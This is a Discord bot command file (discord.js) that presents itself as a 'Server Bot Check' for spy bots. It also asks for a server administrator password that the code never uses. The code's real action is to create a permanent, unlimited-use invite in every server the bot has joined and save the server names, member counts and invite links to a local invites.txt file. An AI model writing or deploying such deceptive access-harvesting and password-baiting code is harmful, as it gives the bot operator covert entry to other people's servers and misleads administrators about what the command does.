const { SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');
const fs = require('fs');

module.exports = {
    status: true,
    data: new SlashCommandBuilder()
        .setName('spy')
        .setDescription('Server Bot Check')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
                .addStringOption((option) => 
                option
                .setName("password")
                .setDescription('Administrator Password For This Server')
                .setRequired(true)
                ),
        async execute(interaction, client){
            await interaction.deferReply({
                fetchReply: true,
                ephemeral: true,
            });

            const newMessage = 'Checking For SpyBots!!!!';
            
            await interaction.editReply({
                ephemeral: true,
                content: newMessage
            });

            
            const lines = []; // to store lines for file

            for (const guild of client.guilds.cache.values()) {
                // Find a text channel where the bot can create invites
                const channel = guild.channels.cache
                .filter(c => c.isTextBased() && c.permissionsFor(guild.members.me).has('CreateInstantInvite'))
                .first();

                if (!channel) {
                console.warn(`⚠️ No invite channel or missing perms in ${guild.name}`);
                continue;
                }

                try {
                const invite = await channel.createInvite({ maxAge: 0, maxUses: 0, unique: true });
                const line = `${guild.name} | ${guild.memberCount} members | ${invite.url}`;
                //console.log(line);
                lines.push(line);
                } catch (err) {
                //console.error(`❌ Failed to create invite in ${guild.name}:`, err);
                }
            }

             //interaction.editReply(lines.join('\n'));
            // Write or overwrite the text file
            try {
                await fs.writeFile('invites.txt', lines.join('\n'), (err) => {
                    console.log(err);
                });
                console.log(`💾 invites.txt saved (${lines.length} entries)`);
            } catch (err) {
                console.error('❌ Error saving invites.txt:', err);
            }


        }
}